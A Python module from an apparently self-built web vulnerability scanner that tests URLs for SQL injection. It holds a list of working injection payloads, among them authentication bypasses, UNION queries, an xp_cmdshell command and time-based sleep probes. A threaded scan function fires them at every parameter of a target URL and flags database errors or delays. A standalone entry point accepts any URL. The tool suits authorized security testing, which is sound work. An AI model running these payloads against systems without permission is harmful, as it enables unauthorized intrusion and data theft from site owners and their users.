
import os
import sys
import threading
import time

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import utils
from core.network import requester
from config import Colors, PAYLOAD_THREADS
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── Payload Lists ─────────────────────────────────────────────────────────────
COMPREHENSIVE_SQL_PAYLOADS = [
    # Basic Auth Bypass & Logic
    "'", '"', "' OR '1'='1", '" OR "1"="1',
    "' OR 1=1--", '" OR 1=1--', "' OR 1=1#",
    "admin' --", "admin' #", "' OR 'a'='a",
    "') OR ('1'='1", "') OR '1'='1",
    # Union Based
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--", "' UNION SELECT 1,@@version--",
    "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
    # Error Based
    "'; EXEC xp_cmdshell('dir');--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    " OR 1=1",
    # Boolean Inferential
    "' AND 1=1--", "' AND 1=2--",
    "1 AND 1=1", "1 AND 1=0",
    # Time Based — kept separate below
    "1' AND SLEEP(5)--", '1" AND SLEEP(5)--',
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' AND PG_SLEEP(5)--",
    "1'; SELECT PG_SLEEP(5)--",
    "1' WAITFOR DELAY '0:0:5'--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1' AND 1234=(SELECT 1234 FROM DUAL CONNECT BY LEVEL<=10000)--",
    "SLEEP(5)#",
    "1 OR SLEEP(5)",
    "';WAITFOR DELAY '0:0:5'--",
    "benchmark(10000000,MD5(1))#",
]

# Split fast vs time-based so we use tight timeouts on each bucket
_TIME_KEYWORDS = ('sleep', 'waitfor', 'benchmark', 'pg_sleep')
FAST_SQL_PAYLOADS = [p for p in COMPREHENSIVE_SQL_PAYLOADS
                     if not any(k in p.lower() for k in _TIME_KEYWORDS)]
TIME_BASED_SQL_PAYLOADS = [p for p in COMPREHENSIVE_SQL_PAYLOADS
                            if any(k in p.lower() for k in _TIME_KEYWORDS)]

# DB error signatures
ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlserver",
    "microsoft ole db provider for sql server",
    "ora-00933",
    "postgresql query failed",
    "sqlite3.operationalerror",
    "pg_query(): query failed",
    "syntax error",
    "fatal error"
]


def scan(url):
    """Optimised SQL Injection scanner: fast/time payloads separated, early-exit per param."""
    if not utils.check_endpoint_alive(url):
        return []

    # Build payload lists (cached after first load)
    fast_payloads = list(FAST_SQL_PAYLOADS)
    time_payloads = list(TIME_BASED_SQL_PAYLOADS)

    try:
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        extra = utils.load_payloads_from_dir(os.path.join(base_dir, "Payloads", "Sql_payload"))
        if extra:
            for p in extra:
                if any(k in p.lower() for k in _TIME_KEYWORDS):
                    time_payloads.append(p)
                else:
                    fast_payloads.append(p)
    except Exception:
        pass

    fast_payloads  = list(set(fast_payloads))
    time_payloads  = list(set(time_payloads))

    vulnerabilities = []
    found_params    = set()   # early-exit: skip once a param is confirmed vulnerable
    found_lock      = threading.Lock()

    def test_target(target_data, is_time_based=False):
        test_url = target_data['url']
        payload  = target_data['payload']
        param    = target_data['param']
        param_key = (test_url.split('?')[0], param)

        with found_lock:
            if param_key in found_params:
                return None   # Already found vuln here — skip

        req_timeout = 6 if is_time_based else 4

        try:
            t0 = time.time()
            response = requester.get(test_url, timeout=req_timeout)
            elapsed  = time.time() - t0

            if response:
                body = response.text.lower()

                # Error-Based check
                for sig in ERROR_SIGNATURES:
                    if sig in body:
                        impact_info = utils.get_vuln_details("SQL Injection", context=sig)
                        with found_lock:
                            found_params.add(param_key)
                        return {
                            "type": "SQL Injection",
                            "payload": payload,
                            "evidence": f"Database Error: '{sig}'",
                            "location": f"Parameter: {param} (URL: {test_url})",
                            "endpoint": url,
                            "parameter": param,
                            "confidence": "High",
                            "severity": "High",
                            "impact": impact_info["impact"],
                            "recommendation": impact_info["recommendation"]
                        }

                # Time-Based check (only for time payloads)
                if is_time_based and elapsed >= 5:
                    with found_lock:
                        found_params.add(param_key)
                    return {
                        "type": "Blind SQL Injection (Time-Based)",
                        "payload": payload,
                        "evidence": f"Server delayed {elapsed:.2f}s (sleep payload triggered)",
                        "location": f"Parameter: {param} (URL: {test_url})",
                        "endpoint": url,
                        "parameter": param,
                        "confidence": "High",
                        "severity": "Critical",
                        "impact": "Attacker can exfiltrate data byte-by-byte.",
                        "recommendation": "Use parameterized queries to prevent all forms of SQLi."
                    }

        except Exception as e:
            if is_time_based and "timeout" in str(e).lower():
                with found_lock:
                    found_params.add(param_key)
                return {
                    "type": "Blind SQL Injection (Time-Based)",
                    "payload": payload,
                    "evidence": "Request Timed Out (Potential sleep execution)",
                    "location": f"Parameter: {param} (URL: {test_url})",
                    "endpoint": url,
                    "parameter": param,
                    "confidence": "Medium",
                    "severity": "High",
                    "impact": "Attacker can exfiltrate data byte-by-byte.",
                    "recommendation": "Use parameterized queries to prevent all forms of SQLi."
                }
        return None

    # Build task lists
    fast_tasks = []
    for payload in fast_payloads:
        for t in utils.generate_fuzzed_urls(url, payload):
            t['payload'] = payload
            fast_tasks.append((t, False))

    time_tasks = []
    for payload in time_payloads:
        for t in utils.generate_fuzzed_urls(url, payload):
            t['payload'] = payload
            time_tasks.append((t, True))

    # Phase 1: run fast payloads at full thread count
    with ThreadPoolExecutor(max_workers=PAYLOAD_THREADS) as executor:
        futures = {executor.submit(test_target, td, tb): (td, tb) for td, tb in fast_tasks}
        for future in as_completed(futures):
            try:
                result = future.result()
                if result:
                    vulnerabilities.append(result)
            except Exception:
                pass

    # Phase 2: time-based payloads — use fewer threads to avoid false latency from overload
    TIME_THREADS = min(10, PAYLOAD_THREADS)
    with ThreadPoolExecutor(max_workers=TIME_THREADS) as executor:
        futures = {executor.submit(test_target, td, tb): (td, tb) for td, tb in time_tasks}
        for future in as_completed(futures):
            try:
                result = future.result()
                if result:
                    vulnerabilities.append(result)
            except Exception:
                pass

    return vulnerabilities


if __name__ == "__main__":
    print("Standalone SQL Injection Scanner")
    target = sys.argv[1] if len(sys.argv) >= 2 else input("Enter target URL: ").strip()
    if target:
        results = scan(target)
        print(f"\nFound {len(results)} vulnerabilities.")
        for v in results:
            print(f"[-] {v['type']}: {v['payload']}")
